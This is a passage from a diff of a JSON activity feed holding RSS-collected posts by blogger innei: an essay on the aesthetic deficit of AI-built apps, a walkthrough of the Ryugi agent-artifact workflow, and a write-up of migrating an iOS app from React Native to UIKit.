+          "login": "innei",
+          "url": "https://innei.in/posts"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "innei",
+          "name": "Shiro (Innei)",
+          "home_url": "https://innei.in/posts"
+        },
+        "article": {
+          "title": "Agent Skill 瘦身：用真实 Session 做 A/B 回归",
+          "url": "https://innei.in/en/posts/tech/agent-skill-token-efficiency-ab-regression",
+          "content_sha256": "2126ffd2948cb7226d23d57c226ea2f9bd1c1bd3275399736d8ae27c00e4518c"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": true,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    },
+    {
+      "id": "a:da0a39ae92f40268",
+      "who": "innei",
+      "who_url": "https://innei.in/posts",
+      "action": "publish",
+      "target": "AI 时代的审美赤字：当人人都能做出一个 App",
+      "target_url": "https://innei.in/en/posts/thinking/ai-aesthetic-deficit-anyone-can-build-an-app",
+      "text": "innei published: AI 时代的审美赤字：当人人都能做出一个 App",
+      "at": "2026-11-18T19:15:35+00:00",
+      "external_id": "a:da0a39ae92f40268",
+      "url": "https://innei.in/en/posts/thinking/ai-aesthetic-deficit-anyone-can-build-an-app",
+      "title": "AI 时代的审美赤字：当人人都能做出一个 App",
+      "content": "A little over half a year ago, I wrote an essay reflecting on this topic: \"\nThe Efficiency Paradox of the AI Era: When Greater Productivity Only Leaves Us Exhausted\n.\" Back then, I asked: in the age of AI, when productivity was supposed to be liberated, why is everyone feeling more exhausted than ever?\nOver the past half-year, this trend has become increasingly obvious.\nDeep, focused mental work has increasingly fractured into constant context switching across multiple projects.\nIt feels like we have all developed ADHD in this era, struggling to stay focused on any single thing for long.\nAnd the more capable models become, the worse it gets: we rarely work on just one thing anymore; instead, we juggle several concurrently.\nMost people are the same way, running multiple side projects at once. Building things has become almost trivial—you can easily crank out several in a single day.\nOn top of that, the breakneck pace of AI has made us deeply dependent on it. Now, even just kicking off a new project requires an assist from AI.\n\"Building It\" Doesn't Mean Skill\nModel progress over the past half-year has been blistering—GPT 5.4 is already an eight-month-old model.\nMeanwhile, Chinese models have been playing catch-up, and by now they are at least on par with GPT 5.4. Just a few months ago, people were still debating whether hitting 5.4 would be enough to be satisfied.\nWith models as capable as they are now, technical barriers have largely vanished, and what people jokingly call \"wishful programming\"—prompting an app into existence—has become all the rage. Even a complete novice can build an app that basically meets requirements, though it might not be very good to use.\nTo be fair, the rapid rise of AI has let more people experience the joy of building software and create tools that help their daily lives or work—and that is genuinely meaningful.\nBut churning out endless garbage apps purely for hype, trend-chasing, and plagiarism is both shameful and sad.\n\"Building It Well\" Doesn't Mean It's Valuable\nIn this environment, design and usability still matter immensely to me. An outsider might not grasp design philosophy or have much aesthetic sense. And among the flood of AI-generated apps everywhere, the vast majority are simply garbage.\nThis breakneck pace of iteration completely bypasses traditional development workflows. Design is no longer an upfront requirement in an AI workflow; it might even be outsourced entirely to whatever taste the model has. Does that mean design no longer matters?\nEven apps from top-tier Chinese tech giants can leave you deeply skeptical of their aesthetics once you try them. Take Tencent's Work Buddy: daily active users have already topped 10 million, yet when I opened it with a sense of reverence, taking in its UI, visual texture, and usability, all I could call it was garbage.\nGranted, perhaps that is because I consider myself a design engineer and have a heightened sensitivity to UI details.\nIn a climate like this, have people simply stopped caring about whether software is intuitive and beautiful?\nMost users do not care about this at all. Even if the UI is hideous, the UX is clumsy, and performance is completely ignored—so long as it barely works, many users have begun to compromise, or just stopped caring altogether in this AI wave. As long as it gets their work done and delivers what they want, that is all that matters.\nExamples like this are everywhere. With so many apps, you have no idea why the interface is so ugly or what the software is even supposed to help you do, yet it still manages to blow up with insane hype in this climate.\nWhen total novices who know nothing about software engineering, architecture, or design can use marketing tactics to churn out a completely pointless piece of garbage, I find that a tragedy of our era.\nMeanwhile, craftsmen who tirelessly polish a product, pouring in genuine ideas, design sensibility, and intuitive usability, get neither the recognition nor the respect they deserve—buried and forgotten simply because their growth tactics fell short. That, too, is a tragedy.\nIn an era like this, does it even make sense to build a product with care anymore?\nThe other end takes the exact same shape: in products, aesthetics are pushed behind whether something can be built at all; in models, the top-tier capabilities are consolidating into just a few companies. You have more and more to choose from, but fewer and fewer things that are actually good.\n\"The Best\" Doesn't Mean It's Yours\nOnce you have used frontier models, though, your appetite is endless. Looking back, even 5.4, as the cutting-edge model of its time, was more than capable of handling most of our daily work—and today, domestic Chinese models have long surpassed that benchmark.\nConstrained by compute and tightening US export controls, domestic models still face an uphill battle against America's frontier. The window to catch up is shrinking, and the frontier is moving at breakneck speed—releasing a new generation every month is considered slow, and competing labs sometimes drop two in a single month. Naturally, everyone still wants to use the most advanced models, but here in China, actually using them is only getting harder.\nAmong frontier model labs, OpenAI has been relatively consumer-friendly and less restrictive with regional geoblocking, but its flagship models are noticeably falling behind Anthropic's. That strikes me as a sad state of affairs. In the closed-source space, Anthropic essentially stands alone at the top right now; while Gemini and OpenAI keep trying to close the distance, the gap still feels immense.\nAnd Anthropic happens to be a deeply anti-human organization. It feels like they just want to play dictator in the AI era, wishing nobody else would make models unless it fits the utopian society they want to construct—which is why they don't want open-weight models to evolve.",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://innei.in/en/posts/thinking/ai-aesthetic-deficit-anyone-can-build-an-app",
+      "content_chars": 5918,
+      "content_sha256": "4921575f1d93cefc9aa4a62fe7cc555c9baf6397ac02c7278b1d8d047d66f09c",
+      "content_fetched_at": "2026-11-28T03:15:00.789945+00:00",
+      "author": "innei",
+      "author_name": "Shiro (Innei)",
+      "author_url": "https://innei.in/posts",
+      "published_at": "2026-11-18T19:15:35+00:00",
+      "collected_at": "2026-11-28T03:11:32.768744+00:00",
+      "tags": [
+        "kind:publish",
+        "src:innei",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://innei.in/posts",
+        "https://innei.in/en/posts/thinking/ai-aesthetic-deficit-anyone-can-build-an-app"
+      ],
+      "refs": {
+        "actor": {
+          "login": "innei",
+          "url": "https://innei.in/posts"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "innei",
+          "name": "Shiro (Innei)",
+          "home_url": "https://innei.in/posts"
+        },
+        "article": {
+          "title": "AI 时代的审美赤字：当人人都能做出一个 App",
+          "url": "https://innei.in/en/posts/thinking/ai-aesthetic-deficit-anyone-can-build-an-app",
+          "content_sha256": "4921575f1d93cefc9aa4a62fe7cc555c9baf6397ac02c7278b1d8d047d66f09c"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": true,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    },
+    {
+      "id": "a:13bf1da4d5efb8a1",
+      "who": "innei",
+      "who_url": "https://innei.in/posts",
+      "action": "publish",
+      "target": "让 Agent 先问清楚、画出来、再证明：我的 Ryugi 工作流",
+      "target_url": "https://innei.in/en/posts/tech/ryugi-workflow",
+      "text": "innei published: 让 Agent 先问清楚、画出来、再证明：我的 Ryugi 工作流",
+      "at": "2026-11-15T09:40:15+00:00",
+      "external_id": "a:13bf1da4d5efb8a1",
+      "url": "https://innei.in/en/posts/tech/ryugi-workflow",
+      "title": "让 Agent 先问清楚、画出来、再证明：我的 Ryugi 工作流",
+      "content": "Ryugi (流儀)\n—Ryugi is a set of interactive artifacts I built for coding agents. Whenever the agent needs to ask me questions or have me pick an approach, it puts them on interactive pages where I can answer directly: design decisions are written up as a document where I choose options item by item and leave sentence-level comments; UI proposals are laid out on a canvas for me to click and choose; and when the work is done, an acceptance page places approved designs side by side with live screenshots so I can approve or reject them group by group. Every choice I make on these pages feeds right back into the agent session that started it.\nRepository\n· Innei\n1.0k\nartideck\nArtideck — Artifacts for coding agents, made to decide with you. Your agent draws artboards, design docs, whiteboards, decks, and verify reports; you pick, comment, and pass right on the page.\nJavaScript\nThe project here was the whiteboard inside my blog editor, haklex. Its editing features had always leaned on Excalidraw, which pulled in a heavy bundle and clashed with the rest of the editor's visual style. I wanted to drop the dependency and roll our own whiteboard around Excalidraw's data format, without touching a single field in existing articles.\nFrom my opening sentence to `git push` took about half a day: two rounds of development, one release, and three downstream projects updated. I typed fewer than 20 messages in chat; wherever I had to make a call, it was turned into questions in a doc or mockups on a canvas. Here is how it went, step by step.\nAfter one prompt: a doc that asks questions\nMy opening prompt was just one sentence: \"Drop the excalidraw dependency and roll our own whiteboard based on its data structures.\"\nThe agent first inspected the code to confirm the scope of changes, then opened a design doc and put its questions directly into it, without following up in the chat box.\nThe questions were embedded right inside the document, each with a recommended option and the reasoning behind it; all I had to do was click my choice on the page. The first question was a fork in the road that determined how big v1 should be—everything that followed depended on it. For two of the questions I skipped the recommendation, and the next round simply picked up from what I chose.\nAfter each round, the conclusions were merged into a \"Decided\" section, noting whether I made the decision or the agent made it for me. I could tell at a glance which items needed another look.\nSection 4 of the design doc, \"Decided\": each conclusion is tagged with who decided it\nAfter two rounds, the document was fleshed out into a full design spec. Before handing it back to me, the agent had an uninvolved reviewer agent do a cold read; it resolved most of the feedback on its own, leaving just two questions for me to settle.\n自研白板编辑器：替换 @excalidraw/excalidraw · Ryugi\nView “自研白板编辑器：替换 @excalidraw/excalidraw” on Ryugi Cloud, a document artifact.\nRyugi\n\"Should we discuss the UI?\"\nOnce the document Q&A was done, I asked: \"Should we discuss the UI?\" The agent said yes—the design spec had marked the UI as \"left to the implementer,\" but these are things you see every time you open the editor.\nText doesn't do UI justice, so it switched to a visual canvas: each group presented several options side by side, the recommended one highlighted with a red border, and sticky notes explaining the reasoning right beside them.\nRound 1 decision fork on the UI canvas: three layout options side by side, with the recommended one outlined in red\nAcross two rounds and five groups, I went with the recommendations every time. With the options drawn out side by side, it was immediately clear which were good and which were bad. The selected mockups were linked into the design spec to guide both implementation and acceptance. Then I replied with \"approve.\"\n白板编辑器界面 · Ryugi\nView “白板编辑器界面” on Ryugi Cloud, an artboard artifact.\nRyugi\nOnce approved, I didn't look at code again\nOnce approved, the agent broke the design spec into 19 small tasks and tackled them one by one on a separate branch.\nEach task followed the same rhythm: write a failing test, watch it fail, write the implementation to make it pass, and commit. Whenever the agent made a call on its own—like minor details that diverged slightly from the spec—it logged it in a ledger. When the chat grew too long and was summarized, it kept working right from that ledger.\nFor over an hour, I didn't type a single word.\nReview, then the acceptance page\nOnce all 19 tasks were finished, the agent handed the branch over to an independent reviewer agent that had played no part in development. For every issue flagged, it reproduced it with a failing test before writing the fix.\nThen it spun up the editor in a real browser, took screenshots and screen recordings, and put together an acceptance page: my approved canvas designs on the left, and how it actually looked running on the right.\nAcceptance page: approved design, live screenshot, and screen recording side by side\nAll I had to do was review each group and approve or reject it. I left a comment on one mockup; it made the fix, took a new screenshot, and placed it right back in the same spot for me to review. Anything it couldn't verify was listed separately on the page, instead of being mixed in with \"Completed.\"\n白板编辑器界面 · Ryugi\nView “白板编辑器界面” on Ryugi Cloud, an artboard artifact.\nRyugi\nRound two: starting from a reference image\nNext, I wanted the whiteboard to look sharper. I pasted a reference image featuring clean headings, drop-shadowed sticky notes, and illustrative stickers, and asked whether stock Excalidraw could pull off that aesthetic.\nIt broke down the elements in the image one by one—what we could already draw, what capabilities were missing—and even guessed I might want an AI to do the drawing. I replied with one sentence: only build general-purpose drawing capabilities.\nNext was the same process: open a new design doc, then three rounds of Q&A. In round three, putting rich-text cards on the whiteboard was my own idea. After a cold read, the reviewer agent flagged two questions that needed my call; the agent added its recommendations, I replied with two numbers, approved, and let it implement and review.\nThe acceptance page for this round measured directly against my reference image: the reference on the left, the recreation inside our editor on the right.\nRound 2 acceptance: reference image side by side with the in-editor recreation\n白板绘制能力扩展：阴影、SVG 元素、富文本卡片 · Ryugi\nView “白板绘制能力扩展：阴影、SVG 元素、富文本卡片” on Ryugi Cloud, a document artifact.\nRyugi\nVerify · 白板绘制能力扩展 · Ryugi\nView “Verify · 白板绘制能力扩展” on Ryugi Cloud, an artboard artifact.\nRyugi\nRelease, then downstream projects\nWith both rounds approved, I asked: \"Can we release now, and then adapt the downstream projects?\" It cut a new release, then went through three projects using the editor one by one—bumping the dependency, running tests, and verifying in a browser that the whiteboard rendered properly.\nDownstream results were posted right on the acceptance page as well, with one screenshot for light mode and one for dark.\nThe same whiteboard in downstream projects: light and dark mode\nThroughout the entire process, logging in to authenticate the npm release was the only thing that needed my manual login—that was the one step the agent couldn't do for me.\nWhat I actually said in the chat\nLooking back, nearly everything I typed in chat over that half-day is captured right here:\nTime\nWhat I said\nWhat happened next\n12:26\nDrop the excalidraw dependency and roll our own whiteboard based on its data structures\nRead code, opened design doc\n13:04\nShould we discuss the UI?\nOpened canvas for UI discussion\n13:18\napprove\nSliced tasks, started implementation\n16:35\nThis looks about ready. Now let's work on extra features.\nCompared against reference image, kicked off Round 2\n16:38\nLet's only build general-purpose drawing capabilities\nNarrowed scope, opened new doc\n17:04\napprove\nImplemented Round 2\n17:56\nCan we release now, and then adapt the downstream projects?\nPublished release, adapted downstream projects\n20:06\npush\nPushed to remote\nEvery other decision was made by clicking options in docs, picking mockups on a canvas, or signing off on the acceptance page. I didn't have to scroll through chat history to find what the agent said; every decision stayed on the page, and all the implementation and acceptance were checked against those same pages.\nBoundaries\nThis workflow doesn't make judgment calls for me. If I skip an open-ended question, it fills in its best guess and flags it, leaving me to decide whether to review it. The acceptance page lists what it couldn't verify, and deciding whether to test further is up to me. What it does is put decisions right in front of me, so I can see at a glance what is settled and what isn't.\nRyugi is open source (\ngithub.com/Innei/ryugi\n). In your terminal, run\nnpx ryugi-artifacts install\n, and select the agent you use to install it. The two design docs, canvas, and acceptance pages mentioned here are all public, so you can see them in their original form.",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://innei.in/en/posts/tech/ryugi-workflow",
+      "content_chars": 9110,
+      "content_sha256": "101597b7468c8f095c8f6e447e615118aff3cfa11cd1c050cdb45901d8ded01a",
+      "content_fetched_at": "2026-11-28T03:15:02.170783+00:00",
+      "author": "innei",
+      "author_name": "Shiro (Innei)",
+      "author_url": "https://innei.in/posts",
+      "published_at": "2026-11-15T09:40:15+00:00",
+      "collected_at": "2026-11-28T03:11:32.768744+00:00",
+      "tags": [
+        "kind:publish",
+        "src:innei",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://innei.in/posts",
+        "https://innei.in/en/posts/tech/ryugi-workflow"
+      ],
+      "refs": {
+        "actor": {
+          "login": "innei",
+          "url": "https://innei.in/posts"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "innei",
+          "name": "Shiro (Innei)",
+          "home_url": "https://innei.in/posts"
+        },
+        "article": {
+          "title": "让 Agent 先问清楚、画出来、再证明：我的 Ryugi 工作流",
+          "url": "https://innei.in/en/posts/tech/ryugi-workflow",
+          "content_sha256": "101597b7468c8f095c8f6e447e615118aff3cfa11cd1c050cdb45901d8ded01a"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": true,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    },
+    {
+      "id": "a:c88c6b17f9a6ce94",
+      "who": "innei",
+      "who_url": "https://innei.in/posts",
+      "action": "publish",
+      "target": "Migrating from React Native to UIKit in 87 Hours: Hollow Out the Data Layer, Then Invert the Host",
+      "target_url": "https://innei.in/en/posts/tech/react-native-to-uikit-migration",
+      "text": "innei published: Migrating from React Native to UIKit in 87 Hours: Hollow Out the Data Layer, Then Invert the Host",
+      "at": "2026-11-08T09:29:52+00:00",
+      "external_id": "a:c88c6b17f9a6ce94",
+      "url": "https://innei.in/en/posts/tech/react-native-to-uikit-migration",
+      "title": "Migrating from React Native to UIKit in 87 Hours: Hollow Out the Data Layer, Then Invert the Host",
+      "content": "Lody iOS started out on Expo + React Native. By October, the chat timeline, composer, Live Activity, and Share Extension had all been rewritten in UIKit—roughly 61,000 lines of Swift alongside 37,000 lines of TypeScript. What remained of React Native was mostly routing and screen-level glue: navigation was split half in Expo Router and half in native code, and every build still ran through\nexpo prebuild\n, Metro, and CocoaPods.\nRepository\n· LodyAI\n535\nlody-ios\nIndependent iOS client for Lody — native chat, sessions, and coding-agent collaboration on iPhone\nSwift\nOn the night of October 24, I decided to remove React Native entirely and replace the remaining screens with UIKit one by one. On the morning of October 28,\n#96\nmerged into\nmain\n, deleting the RN runtime after roughly three and a half days (87 hours) across 482 files (+25,700 / −37,500 lines). I then spent the next three days reorganizing the directory structure around explicit dependency layers.\nWhiteboard\nFinishing the cutover in 87 hours was only possible because the real strangler-fig work had started six weeks earlier. Between early September and mid-October, diff rendering, the chat timeline, and the rich-text composer were extracted into standalone packages, followed by\ncloud-runtime\non October 11. By the time the migration started on October 24, the app was already layered like this:\nWhiteboard\nIn other words, React Native had already been hollowed out into a thin outer shell: the heavy UI primitives were standalone packages, and the data runtime had lived inside a Swift-owned offscreen\nWKWebView\nfrom day one. The migration came down to three questions:\nWhere should the cross-platform boundary live once coding agents make native UI cheap? How do you invert the host of a 100k-line app without freezing trunk? And when offline verification holds pixel diffs to 0.00026, which four regressions still slip through the cracks?\n1. The Shifting Premise: Moving the Shared Boundary from UI to Data\nWe originally chose React Native with a future Android client in mind. The bet was to keep both the data layer and the UI abstraction in RN: React components would describe screen layouts, while iOS and Android would merely supply the underlying native views. When it came time to build Android, we would only need view implementations—neither the data layer nor screen structures would have to be rewritten.\nWhiteboard\nThe left side shows that original bet; the right side shows where we landed. The shared cross-platform boundary moved down from UI to a headless data layer:\ncloud-runtime\nruns inside an offscreen WebView, iOS and a future Android client implement the same versioned contract, and each platform writes its UI natively.\nTwo shifts broke the original equilibrium. First,\ncoding agents collapsed the marginal cost of native UI\n. Writing a separate UI per platform used to be the exact expense RN was meant to save. In this migration, the remaining screens were rewritten in batches alongside coding agents in three and a half days. Once the one-time cost of writing native screens drops that low, paying an ongoing abstraction tax to avoid it no longer pencils out.\nSecond,\nthe three-layer translation tax in navigation\n. Navigation bars, toolbars, and sheets ultimately end up as UIKit, but in RN they had to pass through three layers of translation to get there:\nWhiteboard\nOn the left, every layer maintains its own state and assumptions. As soon as iOS 26 glass styling, iPad split views, and iPhone Duo foldable layouts entered the picture, bugs clustered in the seams between layers (the gray annotations show a few issues hit while adapting for Duo). Our patch against\nreact-native-screens\nstarted on September 10 and was revised 11 times before deletion. On the right, there is no middleman—each view controller owns its navigation items directly.\nEach individual glitch was patchable, but every fix added another layer of state translation between RN and UIKit. On October 17, I got wide-screen layouts working for iPad and iPhone Duo in RN, and the result still felt rough. A week later, I decided to stop patching and go all-in on native.\n2. The Strangler-Fig Inversion: Hollow Out First, Flip the Host Second\nTo swap out the host without halting feature work on\nmain\n, we couldn't start by rewriting screens. We had to unwind a reverse dependency chain: six weeks of preparatory extraction to hollow out the shell, followed by three sequential locks once the cutover began.\nSix Weeks of Prep: Stripping Out Heavy Views and Data Until Only Routing and Context Remained\nThe timeline below lays out the extractions between September 6 and October 24 across two tracks—the data layer and UI primitives:\nThe three heaviest UI subsystems went first: diff rendering (\ndom-webview\n), the chat timeline (ChatKit), and the rich-text composer (\nlexical-swift\n). They were already written in Swift or self-contained DOM bundles that RN screens simply mounted. When we later replaced screens one by one, the new UIKit view controllers imported those packages directly without having to untangle view logic mid-flight.\nRepository\n· LodyAI\n3\nChatKit\nUIKit chat primitives: streaming text reveal, attachment strip, glass surface. iOS 26, Swift 6.\nSwift\nThe data layer was never inside RN to begin with. Swift owned an offscreen\nWKWebView\nwhere sync, local replicas, and retries ran; RN only ever received read-only projections for display. On October 11, that runtime and its protocol types were extracted into\n@lody/cloud-runtime\n.\nEarlier, on September 8, the cloud code had already been split by domain into\nauth\n,\ncatalog\n, and\nsend\n—the exact three boundaries that would become Swift's\nAuthSession\n,\nCatalogSession\n, and\nOutbox\non October 25. By the night of October 24, all RN held besides routing was the state inside five root Context providers.\nLock 1: Establish a Versioned Contract and Sink State into Swift\nWhy didn't day one touch a single screen? Because replacing screens incrementally required UIKit to own navigation first, turning each remaining RN screen into an independently hosted root view. Once screens become separate root views, React Context on a single root component can no longer span across them—so global state had to leave RN first. And for Swift services and native screens to talk to the offscreen runtime without going through RN, Swift and the runtime needed a formal contract.\nPreviously, Swift invoked the runtime by concatenating raw JS strings, which was tolerable when the RN host was the only caller. Now native screens needed to call the runtime directly—and a future Android host would need the exact same surface—so the very first commit on October 24 replaced string interpolation with a schema-driven contract:\nThe Zod schema in\ncloud-runtime\nbecame the single source of truth. Types for every platform are generated from it, and the host and runtime only exchange envelopes carrying a schema version (\nv\n) and instance generation (\ngen\n). Version mismatches fail the handshake immediately, and messages from stale WebView generations are dropped on sight. Swapping the host—or adding a new platform—never touches the runtime.\nOver the next 23 hours, the five React Contexts on the RN root were consolidated into four single-owner Swift services. The left side shows the old RN root provider tree; the right side shows how both RN and UIKit screens read state afterward:\nEach slice of state has a single owner in Swift. Remaining RN screens and new UIKit screens read the same synchronous JSON snapshot and subscribe to the same change event. Splitting screens into separate root views no longer affected shared state—and as a security bonus, long-lived Better Auth credentials now stayed strictly in Swift and Keychain without ever entering the JS context. By the evening of October 25, once\nOutbox\nlanded in Swift and\nCatalogProvider\nwas deleted, the root Context tree was empty.\nLock 2: Invert the Host so UIKit Wraps RN Screens\nWith state out of the way, Expo Router still owned navigation. As long as RN owned navigation, native views could only live as child components inside RN screens—we could never replace a whole screen. The pivotal move was inverting the host relationship: UIKit took over the window and navigation chrome, demoting the remaining RN screens into leaf views hosted inside UIKit containers. The diagram below shows the three stages of the host; this step moved us from left to center:\nWhiteboard\nIn that middle transitional state, each unmigrated RN screen became an isolated surface backed by a single shared\nRCTHost\n. The outer UIKit container didn't care whether a destination was rendered by an RN surface or a native view controller, unlocking true screen-by-screen replacement without blast radius across pages. (Earlier on iPad, I had tried reparenting a mounted RN view into a different superview, which silently broke touch press handling; giving each screen its own surface avoided that trap entirely.)\nThe new UIKit shell went in behind a launch flag first. Compact iPhone navigation and regular-width iPad split navigation were wired up in turn; once both ran cleanly, Expo Router was deleted in the early hours of October 26—six hours from feature flag to router removal.\nLock 3: Cut the Umbilical Cord—Remove the RN Runtime and Build Chain\nOnce all remaining RN leaf screens were replaced with UIKit (covered in the next section), the app still booted through Expo's\nAppDelegate\nand every build still ran through\nexpo prebuild\nand Metro.\n#96\nsevered that final layer—moving from the center of the host diagram to the far right: a native\nAppDelegate\n/\nSceneDelegate\nboots\nLodyApplication\ndirectly, giving lifecycle, deep links, push notifications, and the share inbox native owners. The build pipeline flipped with it:\nThe\nios/\ndirectory is no longer wiped and regenerated by\nprebuild\n; the Xcode project is generated deterministically from a committed\nproject.yml\nvia XcodeGen. React, Expo, Hermes, and the stack of\nreact-native-screens\npatches were deleted together. Only the headless WebView runtime bundle continues to be built with\npnpm\n—the one layer that never changed from start to finish.\nPull Request\n· innei-dev/lody-ios\n#\n96\nrefactor(ios): complete the native app migration and remove React Native\nmerged\n+\n25764\n−\n37457\nLeeeon233\n4 weeks ago\n3. Deterministic Verification and Its Cracks: 0.00026 Pixel Diffs vs. 4 Escaped Regressions\nBetween October 26 and October 28, rewriting every remaining screen in UIKit within 48 hours—without breaking\nmain\n—would have been impossible with manual QA. What made the blitz safe was an offline verification harness; what makes it interesting in hindsight are the four bugs that still escaped it.\nLeaf-to-Trunk Replacement: Isolating Every Screen Behind a Single Service Seam\nOnce the UIKit shell was in charge, every native screen was built around the exact same decoupled structure:\nA view controller's only I/O is a\nservice\nclosure. Production routes inject the\nlive\nimplementation (wired to\nDataRuntime\n,\nCatalog\n, and\nOutbox\n); Debug scenes inject a\nscripted\nimplementation returning fixed fixtures. Both paths run the exact same view controller. Before flipping any screen, we registered an offline Debug scene and a\nverify:ui\nbehavioral test that deep-linked straight into it—no login, no cloud, and no local agent daemon required—running the identical assertion suite before and after the swap.\nWith offline assertions in place, replacement proceeded mechanically from leaves to trunk. On October 26, all Settings sub-screens, Home, and Project screens moved first; that night, the complex Session screen was built in UIKit behind a Debug fixture. On October 27, the remaining screens were conquered in a stack of eight PRs (\n#87\n–\n#94\n): message editing, message details, tool details, permissions, PR view, and file browser, followed by flipping the production Session entry point to native and finishing Home and iPad navigation. On the morning of October 28,\n#86\nand the entire PR stack merged together.\nPull Request\n· innei-dev/lody-ios\n#\n86\nrefactor: UIKit shell and native pages (RN removal phases 2–3)\nmerged\n+\n26846\n−\n18771\nInnei\n5 weeks ago\nWhen\n#96\ndeleted the RN runtime hours later, the offline UI suite ran directly against the pure native build. Across 20 screenshots of the new-session form compared pixel-by-pixel against the previous build, the maximum diff was\n0.00026\n.\nWhere the Harness Cracked: How 4 Regressions Escaped a 0.00026 Pixel Gate\nEven with screenshot diffs pinned to the fourth decimal place and core flows working cleanly, four regressions still surfaced after cutover. Looking at them side by side is revealing—every single one lived on the seam between offline scripted scenes and the real runtime environment:\nWhiteboard\nThe test entry point had no test of its own\n: The Debug screen dispatches every offline scene, yet had no test case covering itself. After converting to UIKit, it regressed into an ungrouped flat list missing its navigation bar.\nBuild configuration skew (Debug vs. Release)\n: Debug scenes were only registered under\nDebug\nand\nUI Verify\nbuild configurations, and automated checks never ran against\nRelease\n. Long-pressing the Settings button in TestFlight builds triggered an unregistered route and crashed immediately.\nOffline stubs bypassed the OS modal hierarchy\n: During Device Flow sign-in,\nSFSafariViewController\npresents over the welcome screen; after authorization completed, dismissing closed only Safari while leaving the welcome screen stuck underneath. Because the \"open browser\" step in the offline fixture was a no-op stub, the real system modal stack was never exercised.\nStatic fixtures skipped async teardown races in the live runtime\n: Opening a session from a push notification caused the previous screen's delayed\ndeinit\nto close the session the new screen had just opened. Offline scenes fed synchronous scripted data without a live\nDataRuntime\n, so that cross-controller lifecycle race never fired under test.\n4. Post-Merge Convergence: Freeze Paths During Cutover, Layer by Dependency After\nThroughout the 87-hour sprint, I followed one strict rule:\nnever move files while changing behavior\n. Keeping file paths frozen meant every commit was a pure implementation swap—easy to review and trivial to\ngit bisect\nif something broke. The trade-off was that when\n#96\nlanded, all 557 Swift files were still sitting inside the legacy Expo module directory, mixing view controllers, data sessions, and platform glue. Only after behavior was locked down did I put on the refactoring hat for three days of structural layering, again doing one thing per step:\nStep 1: Move files without splitting code.\nWith RN gone,\napps/mobile\nand the Expo module path were vestigial. All Swift sources were moved wholesale into a single Swift package,\nLodyKit\n, while dependencies switched from CocoaPods to SPM.\nStep 2: Split along the\nimport UIKit\nboundary.\nAuth, catalog, outbox, the data runtime host, session models, and copy were extracted into\nLodyData\n—a module that never imports UIKit and compiles and tests in isolation. Whenever the data layer needs a platform side effect (opening URLs, requesting background execution time, showing a toast, presenting an auth browser, or writing a Share Extension snapshot), it calls the\nLodyHost\nprotocol, which the top-level App target implements and injects.\nStep 3: Flatten the project hierarchy.\nThe repository root became the Xcode project root, eliminating the\napps/\nwrapper. Finally, the remaining UI code in\nLodyKit\nwas folded back into the App target—the App was its only consumer, while views shared with the Share Extension moved into\nShared/UIKit\nas direct source references. Keeping a separate UI package only added ceremony around access control, so the App target is now organized directly into\nApplication\n,\nNavigation\n,\nViewControllers\n,\nViews\n,\nServices\n, and\nPlatform\n.\nThe resulting dependency graph flows strictly in one direction—the lower a layer sits, the less it knows about UI:\nWhiteboard\nThe repository root is the Xcode project root, generated from the committed\nproject.yml\n; the generated\nLody.xcodeproj\nis never edited by hand.\nTakeaways for Anyone Planning a Similar Migration\nLooking back, the critical factor wasn't how fast UIKit views could be written—it was respecting a strict sequence of dependency locks where each step unlocked the physical precondition for the next:\nStart by deciding\nwhich layer actually deserves to be shared\n. React Native's cross-platform leverage lives in UI; once coding agents make platform-native UI cheap to write, it pays to push the shared boundary down into a headless data runtime behind a versioned contract. Extract heavy UI primitives first, sink shared state out of RN, and then invert the navigation host—once a native shell can host legacy RN screens as isolated leaves, every remaining screen can be replaced and verified independently. And when designing your verification harness, remember to test the test entry point itself,\nRelease\nbuild flags, real OS modal stacks, and async teardown across live runtime sessions.\nI'm not a veteran iOS engineer, and this layering reflects how I reasoned through the problem rather than established orthodoxy. I'm still weighing trade-offs—like whether running a JS data runtime inside an offscreen WebView is worth it long-term, whether protocol injection via\nLodyHost\nis the cleanest way to handle platform side effects, or whether keeping App UI code in folders rather than SPM packages will hold up as the codebase grows. If you've been through a similar migration or would structure this differently, I'd love to hear your thoughts in the comments.",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://innei.in/en/posts/tech/react-native-to-uikit-migration",
+      "content_chars": 17722,
+      "content_sha256": "1fcfe7cb6a3114b3a75102d0ba081b112394d5fd3189d6334f2fb8114f1cec23",
+      "content_fetched_at": "2026-11-28T03:15:03.595231+00:00",
+      "author": "innei",
+      "author_name": "Shiro (Innei)",
+      "author_url": "https://innei.in/posts",
+      "published_at": "2026-11-08T09:29:52+00:00",
+      "collected_at": "2026-11-28T03:11:32.768744+00:00",
+      "tags": [
+        "kind:publish",
